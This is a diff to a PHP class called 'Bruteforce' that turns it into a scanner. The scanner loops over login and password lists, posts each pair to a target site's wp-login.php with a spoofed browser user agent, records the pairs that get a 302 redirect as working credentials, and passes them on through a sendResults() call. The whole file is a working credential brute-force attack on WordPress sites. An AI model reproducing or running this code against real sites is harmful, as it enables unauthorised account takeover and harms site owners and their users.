@@ -6,39 +6,42 @@
  * Date: 03.05.2016
  * Time: 16:03
  */
-class Bruteforce
+class Bruteforce extends Main
 {
-    function __construct($target, $scid)
-    {
-        $this->target = $target;
-        $this->ch = curl_init();
-        $this->scid = $scid;
-        print_r($this);
-        //echo 123;
-    }
 
-    function startBruteforce($logins, $passwords)
-    {
 
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $this->target);
+    function startScan($source)
+    {
+        $logins = $source['logins'];
+        $passwords = $source['passwords'];
+
+        //$result=array();
+        print_r($logins);
+        print_r($passwords);
+        $ch = $this->ch;
+        curl_setopt($ch, CURLOPT_URL, $this->target . "wp-login.php");
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
         curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_NOBODY, 1);
+        //curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
+        //curl_setopt($ch, CURLOPT_NOBODY, 1);
         foreach ($logins as $login) {
             foreach ($passwords as $password) {
                 //curl_setopt($ch,CURLOPT_POSTFIELDS,"log=$login&pwd=$password");
-                curl_setopt($ch, CURLOPT_POSTFIELDS, "username=$login&passwd=$password&task=login");
-                echo curl_getinfo($ch, CURLINFO_HTTP_CODE) . "\n";
+                $ss = "log=$login&pwd=$password&task=login";
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $ss);
+                echo $ss, " ";
                 curl_exec($ch);
+                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE) . "\n";
+                if ($httpcode == 302)
+                    array_push($this->result[$this->scid], array("login" => $login, "password" => $password));
+
             }
         }
-        curl_close($ch);
 
-
+        $this->sendResults();
     }
 
 }
